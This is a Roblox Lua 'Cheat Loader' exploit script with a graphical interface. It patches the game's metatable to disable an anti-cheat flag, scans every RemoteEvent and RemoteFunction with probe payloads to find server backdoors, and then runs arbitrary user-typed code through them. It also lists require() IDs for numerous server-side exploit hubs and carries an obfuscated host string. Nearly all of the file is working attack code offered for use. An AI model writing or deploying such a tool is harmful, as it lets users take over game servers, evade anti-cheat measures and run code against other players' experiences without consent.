local LMG2L = {};

-- Detectar e desabilitar AVID primeiro
local function disableAVID()
    if game:GetAttribute('AVID') then
        game:SetAttribute('AVID', nil)
        print("AVID detectado e desabilitado!")
    end
    
    local mt = getrawmetatable(game)
    local oldnamecall = mt.__namecall
    setreadonly(mt, false)
    
    mt.__namecall = newcclosure(function(self, ...)
        local args = {...}
        local method = getnamecallmethod()
        
        if method == "SetAttribute" and tostring(self) == "game" and args[1] == "AVID" then
            return
        end
        
        return oldnamecall(self, ...)
    end)
    setreadonly(mt, true)
end

disableAVID()

LMG2L["ScreenGui_1"] = Instance.new("ScreenGui")
LMG2L["ScreenGui_1"].Name = "CHEAT LOADER"
LMG2L["ScreenGui_1"].Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
LMG2L["ScreenGui_1"]["ResetOnSpawn"] = false

LMG2L["Frame_2"] = Instance.new("Frame", LMG2L["ScreenGui_1"])
LMG2L["Frame_2"]["BorderSizePixel"] = 0
LMG2L["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
LMG2L["Frame_2"]["Style"] = Enum.FrameStyle.DropShadow
LMG2L["Frame_2"]["Size"] = UDim2.new(0, 588, 0, 292)
LMG2L["Frame_2"]["Position"] = UDim2.new(0, 152, 0, 20)

LMG2L["Frame4_3"] = Instance.new("Frame", LMG2L["Frame_2"])
LMG2L["Frame4_3"]["BorderSizePixel"] = 0
LMG2L["Frame4_3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
LMG2L["Frame4_3"]["Size"] = UDim2.new(0, 76, 0, 40)
LMG2L["Frame4_3"]["Position"] = UDim2.new(0, 100, 0, 230)
LMG2L["Frame4_3"]["Name"] = "Frame4"

LMG2L["UIStroke_4"] = Instance.new("UIStroke", LMG2L["Frame4_3"])
LMG2L["UIStroke_4"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["Frame5_5"] = Instance.new("Frame", LMG2L["Frame_2"])
LMG2L["Frame5_5"]["BorderSizePixel"] = 0
LMG2L["Frame5_5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
LMG2L["Frame5_5"]["Size"] = UDim2.new(0, 92, 0, 38)
LMG2L["Frame5_5"]["Position"] = UDim2.new(0, 326, 0, 230)
LMG2L["Frame5_5"]["Name"] = "Frame5"

LMG2L["UIStroke_6"] = Instance.new("UIStroke", LMG2L["Frame5_5"])
LMG2L["UIStroke_6"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["TextButton2_7"] = Instance.new("TextButton", LMG2L["Frame_2"])
LMG2L["TextButton2_7"]["TextWrapped"] = true
LMG2L["TextButton2_7"]["BorderSizePixel"] = 0
LMG2L["TextButton2_7"]["TextScaled"] = true
LMG2L["TextButton2_7"]["BackgroundColor3"] = Color3.fromRGB(129, 129, 129)
LMG2L["TextButton2_7"]["ZIndex"] = 2
LMG2L["TextButton2_7"]["Size"] = UDim2.new(0, 76, 0, 40)
LMG2L["TextButton2_7"]["Text"] = "CLEAR"
LMG2L["TextButton2_7"]["Name"] = "TextButton2"
LMG2L["TextButton2_7"]["Position"] = UDim2.new(0, 100, 0, 230)

LMG2L["UIStroke_8"] = Instance.new("UIStroke", LMG2L["TextButton2_7"])
LMG2L["UIStroke_8"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["TextButton3_9"] = Instance.new("TextButton", LMG2L["Frame_2"])
LMG2L["TextButton3_9"]["TextWrapped"] = true
LMG2L["TextButton3_9"]["BorderSizePixel"] = 0
LMG2L["TextButton3_9"]["TextSize"] = 15
LMG2L["TextButton3_9"]["TextColor3"] = Color3.fromRGB(28, 43, 54)
LMG2L["TextButton3_9"]["BackgroundColor3"] = Color3.fromRGB(129, 129, 129)
LMG2L["TextButton3_9"]["ZIndex"] = 2
LMG2L["TextButton3_9"]["Size"] = UDim2.new(0, 92, 0, 38)
LMG2L["TextButton3_9"]["Text"] = "INJECT"
LMG2L["TextButton3_9"]["Name"] = "TextButton3"
LMG2L["TextButton3_9"]["Position"] = UDim2.new(0, 326, 0, 230)

LMG2L["UIStroke_a"] = Instance.new("UIStroke", LMG2L["TextButton3_9"])
LMG2L["UIStroke_a"]["Color"] = Color3.fromRGB(255, 255, 255)

local Players = game:GetService("Players")
local HttpSvc = game:GetService("HttpService")
local player = Players.LocalPlayer

local function _h()
    local t = {104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,55,55,55,55}
    local s = ""
    for _,v in ipairs(t) do s = s .. string.char(v) end
    return s
end
local HOST = _h()
local RUNNING = true
local n_exec = 0

local _remote = nil
local _found = false
local CURRENT_KEY = nil
local KEY_LISTENER = nil

local SERVICES = {
    "Workspace","ReplicatedStorage","Lighting","StarterGui",
    "Players","ReplicatedFirst","Teams","StarterPack",
    "SoundService","TextChatService","Chat","MaterialService"
}

local function tryAuth(inst)
    if not inst:IsA("RemoteEvent") then return end
    pcall(function()
        if KEY_LISTENER then KEY_LISTENER:Disconnect() KEY_LISTENER = nil end
        KEY_LISTENER = inst.OnClientEvent:Connect(function(data)
            if typeof(data) == "table" and data.type == "key" and data.key then
                CURRENT_KEY = data.key
            end
        end)
        inst:FireServer({type = "hello"})
    end)
end

local function scanBackdoors(onFound, onDone)
    _found = false
    _remote = nil
    CURRENT_KEY = nil

    for _, svcName in ipairs(SERVICES) do
        local ok, svc = pcall(function() return game:GetService(svcName) end)
        if not ok or not svc then continue end

        for _, inst in ipairs(svc:GetDescendants()) do
            if not (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then continue end

            task.spawn(function()
                if _found then return end

                local tk = tostring(math.random(100000000, 999999999)) .. "_bridge"
                local payload = "d=Instance.new('Model') d.Parent=game:GetService('Workspace') d.Name='" .. tk .. "'"
                local sentOk = pcall(function()
                    if inst:IsA("RemoteEvent") then inst:FireServer(payload)
                    else inst:InvokeServer(payload) end
                end)
                if sentOk and not _found then
                    local found = game:GetService("Workspace"):WaitForChild(tk, 3)
                    if found and not _found then
                        _found = true
                        _remote = inst
                        pcall(function() found:Destroy() end)
                        tryAuth(inst)
                        if onFound then onFound(inst) end
                        return
                    end
                end

                if not _found and inst:IsA("RemoteEvent") then
                    local gotKey = false
                    local conn
                    conn = inst.OnClientEvent:Connect(function(data)
                        if typeof(data) == "table" and data.type == "key" and data.key then
                            if not _found then
                                gotKey = true
                                _found = true
                                _remote = inst
                                CURRENT_KEY = data.key
                                if conn then conn:Disconnect() end
                                KEY_LISTENER = inst.OnClientEvent:Connect(function(d)
                                    if typeof(d) == "table" and d.type == "key" and d.key then
                                        CURRENT_KEY = d.key
                                    end
                                end)
                                if onFound then onFound(inst) end
                            end
                        end
                    end)
                    pcall(function() inst:FireServer({type = "hello"}) end)
                    task.delay(3, function()
                        if not gotKey and conn then conn:Disconnect() end
                    end)
                end
            end)
        end
    end

    task.spawn(function()
        task.wait(6)
        if onDone then onDone(_found, _remote) end
    end)
end

local function runWithBackdoor(code)
    if _found and _remote then
        local ok = false
        if CURRENT_KEY and _remote:IsA("RemoteEvent") then
            ok = pcall(function()
                _remote:FireServer({type = "exec", key = CURRENT_KEY, code = code})
            end)
        end
        if not ok then
            ok = pcall(function()
                if _remote:IsA("RemoteEvent") then _remote:FireServer(code)
                else _remote:InvokeServer(code) end
            end)
        end
        if ok then return true, "backdoor:" .. _remote.Name end
    end
    return false, "no backdoor"
end

LMG2L["TextButton_b"] = Instance.new("TextButton", LMG2L["Frame_2"])
LMG2L["TextButton_b"]["TextWrapped"] = true
LMG2L["TextButton_b"]["BorderSizePixel"] = 0
LMG2L["TextButton_b"]["TextScaled"] = true
LMG2L["TextButton_b"]["BackgroundColor3"] = Color3.fromRGB(129, 129, 129)
LMG2L["TextButton_b"]["ZIndex"] = 2
LMG2L["TextButton_b"]["Size"] = UDim2.new(0, 78, 0, 40)
LMG2L["TextButton_b"]["Text"] = "EXECUTE"
LMG2L["TextButton_b"]["Position"] = UDim2.new(0, 14, 0, 230)

LMG2L["UIStroke_c"] = Instance.new("UIStroke", LMG2L["TextButton_b"])
LMG2L["UIStroke_c"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["UIStroke_d"] = Instance.new("UIStroke", LMG2L["Frame_2"])
LMG2L["UIStroke_d"]["Thickness"] = 2
LMG2L["UIStroke_d"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["Frame3_e"] = Instance.new("Frame", LMG2L["Frame_2"])
LMG2L["Frame3_e"]["BorderSizePixel"] = 0
LMG2L["Frame3_e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
LMG2L["Frame3_e"]["Size"] = UDim2.new(0, 78, 0, 40)
LMG2L["Frame3_e"]["Position"] = UDim2.new(0, 14, 0, 230)
LMG2L["Frame3_e"]["Name"] = "Frame3"

LMG2L["UIStroke_f"] = Instance.new("UIStroke", LMG2L["Frame3_e"])
LMG2L["UIStroke_f"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["TextButton4_10"] = Instance.new("TextButton", LMG2L["Frame_2"])
LMG2L["TextButton4_10"]["BorderSizePixel"] = 0
LMG2L["TextButton4_10"]["TextSize"] = 15
LMG2L["TextButton4_10"]["BackgroundColor3"] = Color3.fromRGB(129, 129, 129)
LMG2L["TextButton4_10"]["ZIndex"] = 2
LMG2L["TextButton4_10"]["Size"] = UDim2.new(0, 58, 0, 38)
LMG2L["TextButton4_10"]["Text"] = "R6"
LMG2L["TextButton4_10"]["Name"] = "TextButton4"
LMG2L["TextButton4_10"]["Position"] = UDim2.new(0, 258, 0, 230)

LMG2L["UIStroke_11"] = Instance.new("UIStroke", LMG2L["TextButton4_10"])
LMG2L["UIStroke_11"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["Frame_12"] = Instance.new("Frame", LMG2L["Frame_2"])
LMG2L["Frame_12"]["BorderSizePixel"] = 0
LMG2L["Frame_12"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
LMG2L["Frame_12"]["Size"] = UDim2.new(0, 410, 0, 200)
LMG2L["Frame_12"]["Position"] = UDim2.new(0, 6, 0, 22)

LMG2L["UIStroke_13"] = Instance.new("UIStroke", LMG2L["Frame_12"])
LMG2L["UIStroke_13"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["UICorner_14"] = Instance.new("UICorner", LMG2L["Frame_2"])

LMG2L["Frame7_15"] = Instance.new("Frame", LMG2L["Frame_2"])
LMG2L["Frame7_15"]["BorderSizePixel"] = 0
LMG2L["Frame7_15"]["BackgroundColor3"] = Color3.fromRGB(129, 129, 129)
LMG2L["Frame7_15"]["Size"] = UDim2.new(0, 118, 0, 252)
LMG2L["Frame7_15"]["Position"] = UDim2.new(0, 438, 0, 14)
LMG2L["Frame7_15"]["Name"] = "Frame7"

LMG2L["UIStroke_16"] = Instance.new("UIStroke", LMG2L["Frame7_15"])
LMG2L["UIStroke_16"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["Frame6_17"] = Instance.new("Frame", LMG2L["Frame_2"])
LMG2L["Frame6_17"]["BorderSizePixel"] = 0
LMG2L["Frame6_17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
LMG2L["Frame6_17"]["Size"] = UDim2.new(0, 58, 0, 38)
LMG2L["Frame6_17"]["Position"] = UDim2.new(0, 258, 0, 230)
LMG2L["Frame6_17"]["Name"] = "Frame6"

LMG2L["UIStroke_18"] = Instance.new("UIStroke", LMG2L["Frame6_17"])
LMG2L["UIStroke_18"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["TextLabel_19"] = Instance.new("TextLabel", LMG2L["Frame_2"])
LMG2L["TextLabel_19"]["ZIndex"] = 2
LMG2L["TextLabel_19"]["BorderSizePixel"] = 0
LMG2L["TextLabel_19"]["BackgroundColor3"] = Color3.fromRGB(129, 129, 129)
LMG2L["TextLabel_19"]["Size"] = UDim2.new(0, 90, 0, 14)
LMG2L["TextLabel_19"]["Text"] = "Cheat Loader"
LMG2L["TextLabel_19"]["Position"] = UDim2.new(0, 6, 0, 2)

LMG2L["UIStroke_1a"] = Instance.new("UIStroke", LMG2L["TextLabel_19"])
LMG2L["UIStroke_1a"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["TextBox_1b"] = Instance.new("TextBox", LMG2L["Frame_2"])
LMG2L["TextBox_1b"]["ZIndex"] = 2
LMG2L["TextBox_1b"]["BorderSizePixel"] = 2
LMG2L["TextBox_1b"]["TextWrapped"] = true
LMG2L["TextBox_1b"]["TextTransparency"] = 0
LMG2L["TextBox_1b"]["ClearTextOnFocus"] = false
LMG2L["TextBox_1b"]["BackgroundColor3"] = Color3.fromRGB(129, 129, 129)
LMG2L["TextBox_1b"]["BorderMode"] = Enum.BorderMode.Inset
LMG2L["TextBox_1b"]["MultiLine"] = true
LMG2L["TextBox_1b"]["PlaceholderText"] = "enter script here "
LMG2L["TextBox_1b"]["Size"] = UDim2.new(0, 410, 0, 200)
LMG2L["TextBox_1b"]["Position"] = UDim2.new(0, 6, 0, 22)
LMG2L["TextBox_1b"]["Text"] = ""
LMG2L["TextBox_1b"]["TextColor3"] = Color3.fromRGB(0, 0, 0)

LMG2L["UIStroke_1c"] = Instance.new("UIStroke", LMG2L["TextBox_1b"])
LMG2L["UIStroke_1c"]["Color"] = Color3.fromRGB(255, 255, 255)

LMG2L["UIDragDetector_1d"] = Instance.new("UIDragDetector", LMG2L["Frame_2"])

LMG2L["Frame2_1e"] = Instance.new("Frame", LMG2L["Frame_2"])
LMG2L["Frame2_1e"]["BorderSizePixel"] = 0
LMG2L["Frame2_1e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
LMG2L["Frame2_1e"]["Size"] = UDim2.new(0, 90, 0, 14)
LMG2L["Frame2_1e"]["Position"] = UDim2.new(0, 6, 0, 2)
LMG2L["Frame2_1e"]["Name"] = "Frame2"

LMG2L["UIStroke_1f"] = Instance.new("UIStroke", LMG2L["Frame2_1e"])
LMG2L["UIStroke_1f"]["Color"] = Color3.fromRGB(255, 255, 255)

local HubScrolling = Instance.new("ScrollingFrame")
HubScrolling.Parent = LMG2L["Frame7_15"]
HubScrolling.BackgroundTransparency = 1
HubScrolling.BorderSizePixel = 0
HubScrolling.Position = UDim2.new(0, 6, 0, 6)
HubScrolling.Size = UDim2.new(1, -12, 1, -12)
HubScrolling.CanvasSize = UDim2.new(0,0,0,0)
HubScrolling.ScrollBarThickness = 4
HubScrolling.ScrollBarImageColor3 = Color3.fromRGB(160,160,160)

local HubLayout = Instance.new("UIListLayout")
HubLayout.Parent = HubScrolling
HubLayout.Padding = UDim.new(0,5)
HubLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function AddHubScript(name, code)
    local btn = Instance.new("TextButton")
    btn.Parent = HubScrolling
    btn.BackgroundColor3 = Color3.fromRGB(80,80,90)
    btn.Size = UDim2.new(1,0,0,30)
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(220,220,235)
    btn.Font = Enum.Font.SourceSansBold
    btn.TextSize = 13
    btn.TextWrapped = true
    
    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0,4)
    
    local stroke = Instance.new("UIStroke", btn)
    stroke.Color = Color3.fromRGB(255,255,255)
    stroke.Thickness = 1
    
    btn.MouseButton1Click:Connect(function()
        local final = code:gsub('""', '"'..player.Name..'"')
                          :gsub("''", "'"..player.Name.."'")
                          :gsub('"name"', '"'..player.Name..'"')
                          :gsub('"username"', '"'..player.Name..'"')
                          :gsub('"plr"', '"'..player.Name..'"')
        LMG2L["TextBox_1b"].Text = final
    end)
end

AddHubScript("SSP", [[require(96288911777671):SSP("")]])
AddHubScript("Rc7", [[require(12350030542).RC7("")]])
AddHubScript("polaria", [[require(110951620907921):Pload("")]])
AddHubScript("Sensation Hub", [[require(100263845596551)("")]])
AddHubScript("Pepsi gui", [[require(113825094179678).pepsi("")]])
AddHubScript("Catlol", [[require(77579329778474).catlol("")]])
AddHubScript("IDE", [[require(121425622240385).dominantultimate("")]])
AddHubScript("Bipolaria", [[require(88477009909590):Pload("")]])
AddHubScript("RoLoader", [[require(112796675826571).RoLoader("name")]])
AddHubScript("Dominant", [[require(135879132527047).dominant("name")]])
AddHubScript("FSA", [[require(72732733952061).FSA("")]])
AddHubScript("Stigma", [[require(132938459666886).stigma("name")]])
AddHubScript("Ro-xploit v7.0", [[require(96184029574075)("")]])

HubLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    HubScrolling.CanvasSize = UDim2.new(0,0,0, HubLayout.AbsoluteContentSize.Y + 20)
end)

LMG2L["TextButton3_9"].MouseButton1Click:Connect(function()
    scanBackdoors(
        function(inst)
            LMG2L["TextButton3_9"].Text = "SUCCESS!"
            LMG2L["TextButton3_9"].BackgroundColor3 = Color3.fromRGB(50,120,60)
        end,
        function(found, remote)
            if found then
                _remote = remote
            else
                LMG2L["TextButton3_9"].Text = "no backdoor!"
                LMG2L["TextButton3_9"].BackgroundColor3 = Color3.fromRGB(140,50,50)
            end
        end
    )
end)

LMG2L["TextButton_b"].MouseButton1Click:Connect(function()
    local code = LMG2L["TextBox_1b"].Text
    if code:match("^%s*$") then return end
    
    local success, msg = runWithBackdoor(code)
    if success then
        print("Executed: " .. msg)
    else
        print("Failed: " .. msg)
    end
end)

LMG2L["TextButton2_7"].MouseButton1Click:Connect(function()
    LMG2L["TextBox_1b"].Text = ""
end)

LMG2L["TextButton4_10"].MouseButton1Click:Connect(function()
    if not _found or not _remote then return end
    
    local r6_code = [[require(3436957371):r6("]] .. player.Name .. [[")]]
    
    local success = runWithBackdoor(r6_code)
end)

print("put script yeah yeah")

return LMG2L["ScreenGui_1"], require;
